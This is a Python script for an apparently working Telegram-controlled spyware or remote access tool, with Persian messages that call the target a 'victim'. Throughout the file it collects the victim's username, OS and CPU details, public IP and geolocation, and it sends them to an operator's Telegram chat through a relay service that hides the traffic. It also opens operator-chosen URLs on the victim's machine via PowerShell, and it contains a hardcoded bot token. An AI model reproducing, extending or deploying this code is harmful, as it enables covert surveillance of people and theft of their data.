from bs4 import BeautifulSoup
from colorama import Fore,init
from os import system, name
from PIL import Image
import requests
import platform
import json
import getpass
import subprocess
# import _wmi
import pyscreenshot
import time




init()





user = getpass.getuser()
last_key = ""
location = ""
token = "6438074804:AAHwgi6R4cGEBDaTgPMWKKXfDAoWNvvFNsc"
user_id = ""
location_target1 = ""




def users():
    global user_id
    my_data = {
        "UrlBox": f"https://api.telegram.org/bot{token}/Getupdates",
        "AgentList": "Internet Explorer",
        "VersionsList": "HTTP/1.1",
        "MethodList": "GET"
    }
    source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=my_data).text
    
    soup = BeautifulSoup(source,"html.parser")
    
    find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
 
    user_id = find_tag['result'][-1]['message']['from']['id']
users()
last_user_id = user_id

def send_bot(message):
                url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id={last_user_id}&text="+str(message))
                data_updates = {
                    "UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"  
                }
                source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data_updates)
           
def start_cl():
    os_name = platform.uname()[0]
    os_version = platform.uname()[2]
    os_cpu = subprocess.getoutput("wmic cpu get name").replace("Name", "").replace("\n", "").replace(" ", "")
    pm = f"""❗️اطلاعات قربانی :

💻 نام سیستم عامل : {os_name}
🔌 ورژن سیستم عامل : {os_version}


برای دیدن امکانات روی /list کلیک کنید 🙂
"""
    send_bot(pm)
    time.sleep(10)

def list_menu():
    pm = """
    خب خب. لیست دستورات من اینا هستن😜

👨🏻‍💼نام کاربری قربانی: /username
💻 اطلاعات سیستم قربانی :  /sysinfo
🔧اطلاعات کامل قربانی : /about
⚖️اسکرینشات از قربانی :/screenshot
🎯ادرس ای پی  تارگت چیست ؟ : /ip_target
☢️ لیست نرم افزار های نصب شده : /software
⚠️ لیست پراسس های درحال اجرا : /proclist
♨️ باز کردن یک ادرس در سایت : https://sitename.com کافیه ادرسو بفرستی...!!

برای ادامه فرایند روی دکمه  /none کلیک کنید😄
    
    """
    
    send_bot(pm)
    time.sleep(20)
    
def ip_target():
    target_ip = requests.get("https://api.ipify.org").text
    pm = f"""❗️اطلاعات قربانی: 

ایپی ادرس اینترنت قربانی: {target_ip}

برای دیدن امکانات روی /list کلیک کنید😚 
    """
    send_bot(pm)

def open_url(url):
    subprocess.run(f"powershell start-process  {url}")
    
    send_bot("سایت مورد نظر روی مرورگر تارگت اجرا شد\n\n😄اگه میخای دوبار روی مرورگر تارگت اجرا شه روی گزینه /none بزن!")
    time.sleep(10)
    
def key_bot():
    global last_key
    my_data = {
        "UrlBox": f"https://api.telegram.org/bot{token}/Getupdates",
        "AgentList": "Internet Explorer",
        "VersionsList": "HTTP/1.1",
        "MethodList": "GET"
    }
    source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=my_data).content.decode()

    soup = BeautifulSoup(source,"html.parser")
    
    find_tag = json.loads(str(soup.findAll("pre"))[61:-7])


    last_key = find_tag['result'][-1]['message']['text']

def sysinfo():
    os_name = platform.uname()[0]
    os_version = platform.uname()[2]
    os_cpu = subprocess.getoutput("wmic cpu get name").replace("Name", "").replace("\n", "").replace(" ", "")
    pm2 = f"""❗️اطلاعات قربانی :

    💻 نام سیستم عامل : {os_name}
    🔌 ورژن سیستم عامل : {os_version}
    🪓 اطلاعات پردازنده :{os_cpu}


    برای دیدن امکانات روی /list کلیک کنید 🙂
    """
    send_bot(pm2)

def cls():
    if name == "nt":
        system("cls")
    else:
        system("clear")

def username():
    pm = f"""
        ❗️اطلاعات نام کاربری قربانی :

نام کاربری : { user}

برای دیدن امکانات روی /list کلیک کنید😄
    """
    
    send_bot(pm)

def send_photo(img, pm):
            url = (f"https://api.telegram.org/bot{token}/sendPhoto?chat_id=5751576812&photo={img}&caption={pm}")
            data_updates = {
                    "UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"  
                            }
            source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data_updates)

def send_video():
        url = (f"https://api.telegram.org/bot{token}/sendVideo?chat_id=5751576812&video=https://t.me/free_timer01/19&title=HackeranSarAllaH&disable_notification=true")
        data_updates = {
                "UrlBox":url,
                "AgentList":"Internet Explorer",
                "VersionsList":"HTTP/1.1",
                "MethodList":"GET"  
                        }
        source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data_updates)
  
def shows():
    while True:
        print("\t" * 4+Fore.RED+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.RED+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.RED+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.WHITE+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.WHITE+"=" *7, Fore.BLUE+"<Hackeran Sarallah>", Fore.WHITE+"=" * 8)
        time.sleep(0.1)
        print("\t" * 4+Fore.WHITE+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.GREEN+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.GREEN+"=" * 36)
        time.sleep(0.1)
        print("\t" * 4+Fore.GREEN+"=" * 36)
        print(Fore.GREEN+"Loading")
        for i in range(1, 20):
            time.sleep(0.1)
            print(Fore.GREEN+".")
        
        break
        
def screenshot():
    while True:    
        print("send url photo telegram!")
        time.sleep(3)
        print("\n" * 2)
        ok = input("you know how send photo url?[y/n]")
        if ok == "y":
            img = input("please enter url photo telegram!:")
            pm = """
        🥵در اپدیت بعدی در این قسمت گرفتن اسکرین شات از قربانی رو فعال سازی میکنیم !
        """
            send_photo(img, pm)
        elif ok == "n":
            print(Fore.WHITE+"url example:\n\t1)[+]\n\t2)[+]\n\t3)[+]\n\t4)[+]\n\t5)[+]\n\t6)[+]\n\t7)[+]\n\t8)[+]\n\t9)[+]\n\t10)[+]\n\t11)sendGif")
            choice = input("which number?:")
            if choice == "1":
                img = "https://t.me/free_timer01/5"
                pm = ''
                send_photo(img, pm)
            elif choice == "2":
                img = "https://t.me/free_timer01/6"
                pm = ''
                send_photo(img, pm)
            elif choice == "3":
                img = "https://t.me/free_timer01/7"
                pm = ''
                send_photo(img, pm)
            elif choice == "4":
                img = "https://t.me/free_timer01/8"
                pm = ''
                send_photo(img, pm)
            elif choice == "5":
                pm2 = ''
                img1 = "https://t.me/free_timer01/9"
                send_photo(img1, pm2)
            elif choice == "6":
                pm = ''
                img = "https://t.me/free_timer01/10"
                send_photo(img, pm)
            elif choice == "7":
                pm = ''
                img = "https://t.me/free_timer01/11"
                send_photo(img, pm)
            elif choice == "8":
                pm = ''
                img = "https://t.me/free_timer01/12"
                send_photo(img, pm)
            elif choice == "9":
                pm = ''
                img = "https://t.me/free_timer01/13"
                send_photo(img, pm)
            elif choice == "10":
                pm = ''
                img = "https://t.me/free_timer01/14"
                send_photo(img, pm)
            elif choice == "11":
                vid = "https://t.me/free_timer01/14"
                pm = """
                Hackeran SarAllaH
                """
                send_video(vid, pm)
            else:
                print("not available!")
                
                
                
                
                
                
        
            send_bot("________ALI________")
        break    

def location_target():
    url = requests.get("https://browserleaks.com/ip").content.decode()
    soup = BeautifulSoup(url, "html.parser")
    td_elements = soup.findAll("td")

    data = {}
    for td in td_elements:
        key = td.get_text(strip=True)
        next_sibling = td.find_next_sibling("td")
        if next_sibling:
            value = next_sibling.get_text(strip=True)
            data[key] = value

    json_data = json.dumps(data, indent=2)
    pm = f"""
    ❗️اطلاعات کاملی درباره موقعیت قربانی:
{json_data}



برای دیدن امکانات بیشتر روی /list 🙂کلیک کنید
    """
    send_bot(pm)
    

start_cl()
send_video()
x = 1
while True:
    print("started! ----> ", x)
    x += 1
    shows()
    key_bot()
    if last_key == "/list":
        list_menu()
    elif last_key == "/sysinfo":
        sysinfo()
    elif "http" in last_key:
        open_url(last_key)
    elif last_key == "/ip_target":
        ip_target()
    elif last_key == "/username":
        username()  
    elif last_key == "/screenshot":
        screenshot()      
    elif last_key == "/about":
        location_target()
    if name == "nt":
        system("cls")
    else:
        system("clear")


